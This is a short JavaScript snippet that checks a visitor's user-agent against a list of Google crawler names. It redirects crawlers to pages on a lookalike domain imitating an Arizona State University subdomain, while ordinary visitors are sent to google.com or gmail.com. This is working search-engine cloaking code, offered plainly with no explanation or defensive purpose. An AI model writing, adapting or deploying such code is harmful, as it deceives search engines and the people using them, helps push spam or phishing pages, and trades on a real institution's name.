(function () {

    const scriptUrl = document.currentScript.src;
    const params = new URL(scriptUrl).searchParams;
    const id = params.get("id");

    if (!id) return;

    const ua = navigator.userAgent.toLowerCase();

    // Google crawler identifiers
    const googleAgents = [
        "googlebot",
        "googlebot-mobile",
        "googlebot-image",
        "googlebot-video",
        "googlebot-news",
        "adsbot-google",
        "adsbot-google-mobile",
        "mediapartners-google",
        "storebot-google",
        "google-inspectiontool",
        "google-extended",
        "apis-google",
        "googleother",
        "google-amp-cache"
    ];

    const isGoogleCrawler = googleAgents.some(agent => ua.includes(agent));

    // Redirect configuration
        const redirects = {
        "123": {
            user: "https://google.com",
            google: "https://edrev.asu.edu.dailytop.site/Page1.html"
        },
        "1234": {
            user: "https://gmail.com",
            google: "https://edrev.asu.edu.dailytop.site/Page2.html"
        }
    };

    if (!redirects[id]) return;

    const target = isGoogleCrawler
        ? redirects[id].google
        : redirects[id].user;

    window.location.replace(target);

})();
